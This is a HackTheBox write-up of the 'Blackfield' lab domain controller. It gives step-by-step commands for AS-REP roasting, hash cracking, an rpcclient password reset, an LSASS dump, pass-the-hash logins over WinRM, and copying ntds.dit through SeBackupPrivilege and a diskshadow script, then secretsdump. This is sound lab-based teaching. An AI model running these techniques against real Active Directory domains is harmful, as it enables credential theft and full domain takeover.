---

title: HackTheBox - Blackfield
layout: post
date: 2020-10-03 23:00:00 +0800

---

![e4b91035871b12ac8cd1cd45348d29d4.png](/images/htb-blackfield/a6468cb9555b4d5a977aeaff8dda5cfd.png)

### 0. Preface

If you didn't know that you could reset passwords through RPCClient, now you do. I also never had a chance to play with SeBackupPrivilege tokens, so this was a very nice learning opportunity as well. 

In this box, we will be tackling: 

1. ASREPRoasting to get valid users and TGTs
2. Using RPCClient to reset passwords
3. Reading memory dump of lsass
4. Abusing SeBackupPrivilege token and dumping NTDS.dit

<!--excerpt-->

---

### 1. Preliminary NMAP Scan

```bash
sudo nmap -sC -sV -oN nmap.txt -p- 10.10.10.192 -v
```

![7cd63ca236f3df14127cffada491d641.png](/images/htb-blackfield/ded3de6087fe4258bbd1b0b2609fa6e6.png)

![c739fa0c00b66ace4aab963ae94582a4.png](/images/htb-blackfield/ccd194d9fc474679a26ea094beb7ed1c.png)

This is a domain controller with the hostname of DC01, and the domain name of `blackfield.local`. WinRM is open, so we can likely use that to gain access into the domain controller later on once we have valid credentials. 

### 2. Active Directory Enumeration

Let's start off with anonymous SMB enumeration. 

![9102085982249843f854ca81f1941d43.png](/images/htb-blackfield/62fd71e83fe24bb3b8b561a398943806.png)

Let's try going into the `profiles$` share. 

![9d66ca42bfa9cdd886364e2144fdf547.png](/images/htb-blackfield/a0a68a8dbd864209ac837b7afec610a1.png)

This gives us a ton of potential usernames. Let's try to ASREPRoast these usernames. 

```
GetNPUsers.py blackfield.local/ -no-pass -usersfile userlist.txt -dc-ip 10.10.10.192
```

![5ddbc9e5b1699fabb41216d135be0a56.png](/images/htb-blackfield/878e7afbb23046be88e81fb0a4d3df64.png)

Awesome. We got a hit. Out of the whole list, it seems like only `support`, `audit2020` and `svc_backup` are valid users. Let's crack the TGT for `support` using `john`. 

```text
sudo john --wordlist:/usr/share/wordlists/rockyou.txt support.hash
sudo john --show support.hash
```

![b10b66bfa22d417dfeb8d6276972cb63.png](/images/htb-blackfield/1ba72baa13d24da792dc1907fa1e60b7.png)

We have our first set of credentials - `support:#00^BlackKnight`

### 3. RPCClient Password Reset

Let's use `rpcclient` to further enumerate the domain controller using the credentials we got earlier. 

```text
rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.192

enumalsgroups builtin
queryaliasmem builtin 0x244
lookupsids S-1-5-21-4194615774-2175524697-3563712290-1413
```
 
![06cb1700cb342781d33fb09228dd5253.png](/images/htb-blackfield/546c6573f47c4293b9c1398d95e72b1f.png)

We find that `svc_backup` is part of remote management group, which will allow us access into the domain controller if we manage to get the password. 

Back tracking a bit, there is a forensic share with the comment forensic/audit share. Quick guess - this is accessible using the  `audit2020` user. 

Let's see if we can't reset the password for `audit2020` [using rpcclient](https://malicious.link/post/2017/reset-ad-user-password-with-linux/).

```text
rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.192

setuserinfo2 audit2020 23 'P@$$w0rd12345'
```

![c613a405d8e113571ea6d221eb430716.png](/images/htb-blackfield/db7565ab16e6450d88600ca4e87febf3.png)

Awesome, seems to be successful. 

### 4. Extracting NTHashes from LSASS Memory Dump

Let's see what the `audit2020` user can access using `smbmap`.

```text
smbmap -u 'audit2020' -d 'blackfield.local' -p 'P@$$w0rd12345' -H 10.10.10.192
```

![964dc95b39d3009c343b75744ed052a1.png](/images/htb-blackfield/b5c70faae6a245abaec8c5eb1fecb64a.png)

We guessed right. Let's download everything from the forensic share and enumerate it offline.

![df1519b8385f8f9ae8db526b9734f993.png](/images/htb-blackfield/11ac8be0b86d455681dd05a8e283ef2c.png)

There's a lot of files in here, so let's focus on the only one that matters. 

There is a folder that contains the memory dumps of some processes.

![7c96810edab3f84db8dab222f6e9fe5c.png](/images/htb-blackfield/033e4d6aade14a2cadd349365ebab4a5.png)

What sticks out is `lsass.zip`, which contains hashes of all logged on users at that point in time. 

Let's extract it. 

![f759867774f60838036f33c893688e95.png](/images/htb-blackfield/49668e9e10c541cf98c3cf223f367e9c.png)

Now that we have the dump file, let's use `pypykatz` to dump the hashes from it.

```bash
pypykatz lsa minidump lsass.DMP >> lsass-dump.txt
```

![40ee337413c2fc87dc726dd80cc52308.png](/images/htb-blackfield/300f5a480b084de0a10fde998ea06da2.png)

Awesome, we got the hash of `svc_backup` and `administrator`.

![5385241a9e91cf5e7bc00861f7dd53aa.png](/images/htb-blackfield/8c344b1786e149279cd44176c269efb3.png)

### 5. Exploiting Backup Privileges

First, let's try to pass the administrator hash using `evil-winrm`.

```bash
evil-winrm -i 10.10.10.192 -u 'blackfield.local\administrator' -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
```

![775d8ac8d5e909bebc1b194ca80d4506.png](/images/htb-blackfield/9baf5921e8e74ce690ae646aba70ccec.png)

Seems like the password has been changed since the dump. Let's try `svc_backup` next.

```bash
evil-winrm -i 10.10.10.192 -u 'blackfield.local\svc_backup' -H 9658d1d1dcd9250115e2205d9f48400d
```

![01cbe65ec2ccf491604fc7435ab9264b.png](/images/htb-blackfield/69005f9594704403b532a343da3ff05b.png)

We're in. Let's grab the user flag from the desktop first. 

Next, let's see what rights this user has.

![eca6154b8c99889864241ab731c6a056.png](/images/htb-blackfield/80af0875fbd84e7984b4b3fedc6ca0c7.png)

We see that it has both the SeBackupPrivilege and SeRestorePrivilege tokens, which allows us to read, copy and write to any file in the system. 

We should be able to exploit these privileges by copying out and extracting the administrator LM/NTHash from `ntds.dit`, which is the password database for Active Directory servers.

After a fair bit of Googling, we find [this Github repository](https://github.com/giuliano108/SeBackupPrivilege) which contains PowerShell cmdlets to allow us to exploit the SeBackupPrivilege token. We also find [this Github repository](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#abusing-backup-operators-group), which walks through how to create a shadow copy backup of the domain controller, since the `ntds.dit` cannot be copied out normally. 

First, let's create a `script.txt` file with the following content to prepare to shadow copy "backup" the domain controller.

```text
set context persistent nowriters
set metadata c:\windows\system32\spool\drivers\color\example.cab
set verbose on
begin backup
add volume c: alias mydrive

create

expose %mydrive% w:
end backup
```

To prevent weird encoding issues, use `unix2dos script.txt` to convert it to dos (windows) format. Now, let's upload the file to the remote session using `evil-winrm`. 

![f6c14a634c331281cfdd9e2d2bf802d9.png](/images/htb-blackfield/3168d99527364bd4af253a3561a107c6.png)

Now, we can run `diskshadow /s script.txt` to trigger the shadow copy backup, which will be exposed on `w:\`. 

![d2e0f81147aff20a5a10c3d31f9d6b92.png](/images/htb-blackfield/35c52e3a76c345f184f587343cf80d31.png)

Before we can actually copy out `ntds.dit` from the shadow copy backup, we will need to make use of the PowerShell cmdlets found in the first Github repository earlier. 

We can upload the whole SeBackupPrivilegeCmdlets folder into the server using `evil-winrm`. 

![22c2ef1dc14bda4010a186bfa5911bba.png](/images/htb-blackfield/f21f9a92689347baaf25591df07716df.png)

Next, we can import the modules found in the `/bin/debug` folder. You can run `Get-Module` after this to verify that they have been imported successfully.

```powershell 
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
```

![a8f5ddf38cc13c6286559d4729f10cb3.png](/images/htb-blackfield/a123e76505304d30a2486837207299f4.png)

Next, navigate to `W:\windows\ntds`. 

![d9cbfcf667e79697520cb9fa9178b3c9.png](/images/htb-blackfield/320971581804474f889140bf8a037c6f.png)

Copy the `ntds.dit` file using `Copy-FileSeBackupPrivilege`, but ensure that the destination filename is different or it will not work.

```powershell
Copy-FileSeBackupPrivilege ntds.dit $env:LOCALAPPDATA\microsoft\database
```

We also need the `HKLM\SYSTEM` registry hive to dump the `ntds.dit` file, so let's grab that too. 

```powershell
reg save HKLM\SYSTEM $env:LOCALAPPDATA\microsoft\sys
```

Let's download everything back to our machine.

![bd98bdeb004cabbb14355a0c37fba280.png](/images/htb-blackfield/f3ca200f46e34a359d934e418608d132.png)

![f2c6683d0f4c239bed8ad2763a69e26f.png](/images/htb-blackfield/bdff53ab3dc744deb2fbb61cf40554d5.png)

Now, let's use `secretsdump.py` to dump `ntds.dit`. 

```bash
secretsdump.py -system sys -ntds database LOCAL >> secretsdump.txt
```

![99228ae5aec0fbc56eb93ab24d41a3ae.png](/images/htb-blackfield/fba0ffe096b04db089539876b869f689.png)

Now we can finally pass the (real) administrator hash and get the root flag.

![ba41e182e26278e5d8020088edece4cd.png](/images/htb-blackfield/ace1737b360545d0a726441625ef2bbc.png)